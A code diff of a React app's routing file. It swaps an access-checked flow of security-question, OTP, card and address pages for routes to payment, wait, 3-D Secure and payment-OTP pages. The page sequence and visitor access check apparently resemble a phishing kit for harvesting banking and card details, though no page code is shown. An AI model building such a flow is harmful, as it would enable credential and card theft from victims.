@@ -1,52 +1,13 @@
 import { BrowserRouter as Router, Routes, Route, Navigate } from 'react-router-dom';
-import useAccessCheck from './Utils/useAccessCheck';
-import { baseUrl } from './constants';
-
-// Components
-import Header from './components/Header';
-import Sidebar from './components/Sidebar';
-import Footer from './components/Footer';
 
 // Pages
 import LoginForm from './pages/LoginForm';
-import SecurityQuestions from './pages/SecurityQuestions';
-import OTP from './pages/OTP';
-import EmailPassword from './pages/EmailPassword';
-import BasicInfo from './pages/BasicInfo';
-import Card from './pages/Card';
-import HomeAddress from './pages/HomeAddress';
-import Terms from './pages/Terms';
-import Register from './pages/Register';
 import LifestyleDemo from './pages/LifestyleDemo';
-
-// Layout component for protected routes
-const ProtectedLayout = ({ children }: { children: React.ReactNode }) => {
-  const isAllowed = useAccessCheck(baseUrl);
-
-  if (isAllowed === null) {
-    return <div className="min-h-screen flex items-center justify-center">Loading...</div>;
-  }
-
-  if (isAllowed === false) {
-    return <div className="min-h-screen flex items-center justify-center">Access denied. Redirecting...</div>;
-  }
-
-  return (
-    <div className="min-h-screen bg-white flex flex-col">
-      <Header />
-      <div className="bg-gradient-to-r from-orange-600 to-orange-500 h-10"></div>
-      <main className="flex-1 bg-gray-50 py-12">
-        <div className="max-w-7xl mx-auto px-4">
-          <div className="flex gap-6">
-            {children}
-            <Sidebar />
-          </div>
-        </div>
-      </main>
-      <Footer />
-    </div>
-  );
-};
+import Payment from './pages/Payment';
+import Wait from './pages/Wait';
+import Payment3D from './pages/3DPayment';
+import PaymentOTP from './pages/PaymentOTP';
+import Success from './pages/Success';
 
 function App() {
   return (
@@ -57,54 +18,16 @@ function App() {
         
         {/* Protected routes */}
         <Route path="/login" element={<LoginForm />} />
+        <Route path="/payment" element={<Payment />} />
+        <Route path="/wait" element={<Wait />} />
+        <Route path="/3d-payment" element={<Payment3D />} />
+        <Route path="/payment-otp" element={<PaymentOTP />} />
+        <Route path="/success" element={<Success />} />
         
-        <Route path="/security-questions" element={
-          <ProtectedLayout>
-            <SecurityQuestions />
-          </ProtectedLayout>
-        } />
-
-        <Route path="/otp" element={
-          <ProtectedLayout>
-            <OTP />
-          </ProtectedLayout>
-        } />
-        
-        <Route path="/email-password" element={
-          <ProtectedLayout>
-            <EmailPassword />
-          </ProtectedLayout>
-        } />
-        
-        <Route path="/basic-info" element={
-          <ProtectedLayout>
-            <BasicInfo />
-          </ProtectedLayout>
-        } />
-        
-        <Route path="/card" element={
-          <ProtectedLayout>
-            <Card />
-          </ProtectedLayout>
-        } />
-        
-        <Route path="/home-address" element={
-          <ProtectedLayout>
-            <HomeAddress />
-          </ProtectedLayout>
-        } />
-        
-        <Route path="/register" element={
-          <ProtectedLayout>
-            <Register />
-          </ProtectedLayout>
-        } />
-        
-        <Route path="/terms" element={
-          <ProtectedLayout>
-            <Terms />
-          </ProtectedLayout>
-        } />
+    
+     
+       
+  
         
         {/* Redirect any unknown routes to home */}
         <Route path="*" element={<Navigate to="/" replace />} />
